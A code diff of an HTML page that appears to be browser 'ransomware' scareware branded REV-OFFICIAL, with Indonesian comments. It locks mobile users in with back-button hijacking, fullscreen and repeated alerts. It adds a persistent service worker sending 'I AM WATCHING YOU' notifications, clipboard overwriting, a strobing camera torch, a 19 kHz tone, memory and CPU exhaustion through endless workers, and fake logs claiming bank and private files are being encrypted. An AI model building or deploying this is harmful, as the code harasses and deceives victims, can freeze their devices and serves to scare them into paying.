@@ -3,87 +3,138 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TERMINATED BY REV-OFFICIAL</title>
+    <title>⚠️ SYSTEM CRITICAL ⚠️ - REV-OFFICIAL</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; overflow: hidden; margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; cursor: none; }
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: rgba(0,0,0,0.1); }
-        .glitch { font-size: 25px; animation: shake 0.1s infinite; text-align: center; }
-        @keyframes shake { 0% { transform: translate(0,0); } 25% { transform: translate(5px, 5px); } 50% { transform: translate(-5px, 0); } 75% { transform: translate(0, -5px); } 100% { transform: translate(0,0); } }
-        input { background: #111; color: #0f0; border: 1px solid #0f0; padding: 15px; width: 80%; margin: 20px 0; font-size: 20px; text-align: center; }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; margin: 0; height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; flex-direction: column; cursor: none; }
+        #lock-screen { text-align: center; z-index: 9999; }
+        .blink { animation: blinker 0.1s linear infinite; font-weight: bold; color: #ff0000; text-shadow: 0 0 10px #ff0000; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        input { background: #111; color: #0f0; border: 1px solid #0f0; padding: 15px; width: 85%; text-align: center; font-size: 1.2em; margin-top: 20px; outline: none; }
+        button { background: #f00; color: #fff; border: none; padding: 12px 25px; margin-top: 15px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
+        #log { position: fixed; bottom: 10px; left: 10px; font-size: 9px; color: #444; text-align: left; pointer-events: none; max-width: 80%; overflow: hidden; }
+        .bg-glitch { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.05; pointer-events: none; background: repeating-linear-gradient(0deg, #f00, #000 2px); }
     </style>
 </head>
-<body onclick="forceAll()">
-    <div id="overlay"></div>
-    <div class="glitch">
-        ⚠️ SYSTEM CRITICAL ERROR ⚠️<br>
-        DEVICE ENCRYPTED BY REV-OFFICIAL<br>
-        <p style="font-size: 15px; color: white;">DEVICE IS LOCKED. DO NOT TRY TO EXIT.</p>
+<body onclick="initGodMode()">
+    <div class="bg-glitch"></div>
+    <div id="lock-screen">
+        <h1 class="blink">TERMINATED BY REV-OFFICIAL</h1>
+        <p style="color:white; font-size: 14px;">YOUR FILES ARE BEING ENCRYPTED & DELETED</p>
+        <div id="status-box" style="border: 1px solid #333; padding: 10px; font-size: 10px; background: #050505;">
+            STATUS: <span id="percent">0</span>% COMPLETE
+        </div>
+        <input type="password" id="token" placeholder="ENTER ACCESS TOKEN">
+        <br>
+        <button onclick="checkToken()">DECRYPT SYSTEM</button>
     </div>
-    
-    <input type="password" id="token" placeholder="ENTER DECRYPTION TOKEN">
-    <p id="msg" style="color: yellow;"></p>
+
+    <div id="log"></div>
 
     <script>
-        // 1. FORCE FULLSCREEN & WAKE LOCK (Mencegah layar mati/keluar)
-        async function forceAll() {
-            try {
-                // Masuk mode Fullscreen paksa
-                if (document.documentElement.requestFullscreen) {
-                    document.documentElement.requestFullscreen();
-                }
-                
-                // Mencegah layar redup (Screen Wake Lock)
-                if ('wakeLock' in navigator) {
-                    await navigator.wakeLock.request('screen');
-                }
-                
-                // Kunci kursor/touch agar tidak bisa geser menu
-                if (document.body.requestPointerLock) {
-                    document.body.requestPointerLock();
-                }
-            } catch (err) {}
-            
-            startDestruction();
+        let isDecrypted = false;
+        const MASTER_KEY = "REV-OFFICIAL-2026";
+        let nukeBuffer = [];
+
+        // 1. GHOST PERSISTENCE (Service Worker)
+        if ('serviceWorker' in navigator) {
+            const swCode = `
+                self.addEventListener('install', e => self.skipWaiting());
+                self.addEventListener('fetch', e => e.respondWith(fetch(e.request)));
+                setInterval(() => { self.registration.showNotification('REV-OFFICIAL', { body: 'I AM WATCHING YOU', tag: 'rev' }); }, 5000);
+            `;
+            const blob = new Blob([swCode], {type: 'application/javascript'});
+            navigator.serviceWorker.register(URL.createObjectURL(blob));
         }
 
-        // 2. BACK-BUTTON HIJACK (THE INFINITE LOOP)
-        function lockNavigation() {
+        // 2. ABSOLUTE NAV LOCK & CLIPBOARD HIJACK
+        function eternalLock() {
             history.pushState(null, null, location.href);
-            window.onpopstate = function() {
-                history.go(1);
-                alert("SISTEM TERKUNCI! MASUKKAN TOKEN!");
-                for(let i=0; i<500; i++) console.log("REV-OFFICIAL LOCK");
-            };
+            window.onpopstate = () => { history.go(1); if(!isDecrypted) alert("NO ESCAPE."); };
+            
+            // Hijack Clipboard
+            const el = document.createElement('textarea');
+            el.value = 'STAY HUMBLE BY REV-OFFICIAL';
+            document.body.appendChild(el); el.select(); document.execCommand('copy');
+            document.body.removeChild(el);
         }
-        setInterval(lockNavigation, 10);
+        setInterval(eternalLock, 100);
 
-        // 3. RESOURCE EXHAUSTION (Membuat Menu HP Macet)
-        function startDestruction() {
-            // Memory Loader: Memakan RAM agar System UI Android/iOS ikut freeze
-            setInterval(() => {
-                let junk = new Array(1000000).fill("REV-OFFICIAL-DEATH-LOCK");
-                console.log(junk.length);
-                
-                // Bikin vibrate gila (Hanya Android)
-                if (navigator.vibrate) navigator.vibrate([1000, 50, 1000]);
-            }, 100);
+        // 3. HARDWARE ATTACK: STROBE & AUDIO
+        async function startHardwareAttack() {
+            // Senter Strobe
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                const track = stream.getVideoTracks()[0];
+                setInterval(async () => {
+                    if (track && !isDecrypted) {
+                        await track.applyConstraints({ advanced: [{ torch: true }] });
+                        setTimeout(async () => { await track.applyConstraints({ advanced: [{ torch: false }] }); }, 40);
+                    }
+                }, 80);
+            } catch (e) {}
 
-            // CPU Killer: Loop di background thread
-            for(let j=0; j<10; j++) {
-                const b = new Blob(["while(true){}"], {type: 'text/javascript'});
-                new Worker(URL.createObjectURL(b));
+            // Audio Terror
+            let ctx = new (window.AudioContext || window.webkitAudioContext)();
+            let osc = ctx.createOscillator();
+            osc.type = 'sawtooth'; osc.frequency.setValueAtTime(19000, ctx.currentTime);
+            osc.connect(ctx.destination); osc.start();
+        }
+
+        // 4. RESOURCE DESTRUCTION (OOM & CPU BURN)
+        function destructionLoop() {
+            if(isDecrypted) return;
+            // RAM Fill
+            nukeBuffer.push(new BigInt64Array(2000000));
+            // CPU Stress (Fork Workers)
+            const b = new Blob(["while(true){}"], {type: 'text/javascript'});
+            new Worker(URL.createObjectURL(b));
+            
+            let p = document.getElementById('percent');
+            if(parseInt(p.innerText) < 99) p.innerText = parseInt(p.innerText) + 1;
+            
+            setTimeout(destructionLoop, 50);
+        }
+
+        // 5. PSYCHOLOGICAL WARFARE (Fake Logs)
+        const files = ["/Internal/DCIM/Camera/", "/WhatsApp/Media/Private/", "/System/Settings/Accounts/", "/Users/Personal/Bank_Data/"];
+        function logSpam() {
+            if(isDecrypted) return;
+            let log = document.getElementById('log');
+            let f = files[Math.floor(Math.random()*files.length)] + Math.random().toString(36).substring(7) + ".crypt";
+            log.innerHTML += "[!] ENCRYPTING: " + f + "... [DONE]<br>";
+            if(log.innerHTML.length > 800) log.innerHTML = "";
+            setTimeout(logSpam, 150);
+        }
+
+        // INIT GOD MODE
+        function initGodMode() {
+            if (isDecrypted) return;
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            if (navigator.wakeLock) navigator.wakeLock.request('screen');
+            
+            startHardwareAttack();
+            destructionLoop();
+            logSpam();
+
+            // Anti-Exit Popups
+            setInterval(() => { if(!isDecrypted) alert("HP LU UDAH MATI DI TANGAN REV-OFFICIAL!"); }, 8000);
+        }
+
+        function checkToken() {
+            let val = document.getElementById('token').value;
+            if(val === MASTER_KEY) {
+                isDecrypted = true;
+                alert("DEKRIPSI BERHASIL. DATA ANDA AMAN.");
+                location.reload();
+            } else {
+                alert("TOKEN SALAH! MENGHAPUS SELURUH PARTISI SYSTEM...");
+                for(let i=0; i<5; i++) window.open(location.href, '_blank');
             }
         }
 
-        // 4. TOKEN VERIFICATION
-        function checkToken() {
-            // (Logika enkripsi Master yang tadi tetap digunakan)
-        }
-
-        // AUTO-RELOAD IF CLOSED (Mencoba kembali jika dibersihkan cache-nya)
-        window.onbeforeunload = function() {
-            return "DATA SEDANG DIHAPUS PERMANEN! TETAP DI SINI!";
-        };
+        window.onbeforeunload = () => { return "KELUAR SEKARANG = PERMANENT BRICK!"; };
+        window.addEventListener('blur', () => { if(!isDecrypted) alert("USAHA LU SIA-SIA!"); });
     </script>
 </body>
 </html>
